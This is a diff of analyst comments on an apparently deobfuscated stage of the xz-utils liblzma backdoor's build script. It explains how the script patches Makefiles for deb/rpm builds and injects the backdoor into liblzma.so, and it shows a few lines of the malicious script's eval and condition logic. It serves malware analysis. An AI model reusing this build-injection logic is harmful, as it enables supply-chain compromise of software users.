@@ -14,11 +14,14 @@ U="bad-3-corrupt_lzma2.xz"
 # This is never defined, I can only assume it's some debug thing?
 eval $zrKcVq
 
-# There's something very fishy with this if, basically the whole backdoor doesn't get extracted and included if we're running makefiles?!?
-# Either that, or it's called 2 times, one to patch the makefile, and a 2nd time to patch the lib binary
-# I'm more inclined to believe the 2nd one, as of now...
+# The backdoor is actually called multiple times, as this is the only ones that actually "do something" (as, editing/creating files),
+# There's conditions so it only do things when the proper conditions are met:
+#   * Either it's ran in the top-level dir (eg. xz-5.6.1/), then it do Makefile patching if we're creating a deb or rpm package
+#   * Or it's ran under src/liblzma, then it patches, re-compile crc64_fast.c, then link liblzma.so with the backdoor inside
+# The takeaway here is: THIS IS NOT ONLY FOR DEBIAN AND RHEL! the deb/rpm conditional part is only the Makefile patching
+# Also, there's two addons for the 2 calls, those aren't conditionnal at all, so it could be that this was a patch/runtime fix mechanism, not "2 differents addons", the first is the top-level patch, the second is the liblzma patch
 
-# Check that the config.status exists (we're using ./configure)
+# It's the top-level makefile that calls it (config.status exists), patches Makefiles for .deb and .rpm
 if test -f config.status; then
 
 	# Debug thing again
@@ -249,7 +252,7 @@ if test -f config.status; then
 		eval $zrKcHD
 	fi
 
-# If there wasn't a config.status file (we're using cmake?), but there's still the crc32 and crc64 .o files
+# If we're in src/liblzma (the liblzma .o files exists), actually patch liblzma to include the backdoor
 elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
 
 	# Addon 2: 'jV!.^%' to '%.R.1Z'
